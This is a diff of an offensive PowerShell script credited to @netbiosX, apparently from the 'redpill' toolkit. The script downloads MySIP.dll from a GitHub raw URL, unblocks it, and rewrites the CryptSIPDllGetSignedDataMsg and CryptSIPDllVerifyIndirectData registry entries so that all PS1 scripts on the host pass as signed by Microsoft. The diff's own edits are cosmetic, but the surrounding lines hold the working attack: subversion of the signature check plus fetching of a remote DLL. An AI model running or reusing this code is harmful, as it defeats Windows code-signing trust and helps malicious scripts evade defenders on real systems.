@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    Author: @netbiosX
 
@@ -13,7 +13,7 @@
 )
 
 $ErrorActionPreference = "SilentlyContinue"
-write-host "`n* Digitally sign all PS1 scripts on the host." -ForegroundColor Green
+write-host "`n* Digitally sign ALL PS1 scripts on the host." -ForegroundColor Green
 Start-Sleep -Milliseconds 500
 
 
@@ -32,12 +32,12 @@ If(-not(Test-Path -Path "$DllPath"))
 {
    write-host "+ " -ForegroundColor DarkYellow -NoNewline
    write-host "Downloading MySIP.dll from GitHub .." -ForegroundColor DarkGray
-   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/MySIP.dll" -OutFile "$DllPath"|Unblock-File
+   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/CertSign_PS1/MySIP.dll" -OutFile "$DllPath"|Unblock-File
 }
 
 
 #Digitally sign all powershell scripts on the host as Microsoft
-write-host "* Digitally sign all PS1 scripts on the host as Microsoft" -ForegroundColor Green
+write-host "* Digitally sign ALL PS1 scripts on the host as Microsoft" -ForegroundColor Green
 $GetCertFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' + '\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg' -join ''
 
 
@@ -53,7 +53,7 @@ $PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName
 
 
 #Validate the digital signature for all powershell scripts
-write-host "* Validate the digital signature for all powershell scripts" -ForegroundColor Green
+write-host "* Validate the digital signature for ALL powershell scripts" -ForegroundColor Green
 $ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' + '\OID\EncodingType 0\CryptSIPDllVerifyIndirectData' -join ''
 
 #PowerShell SIP Guid
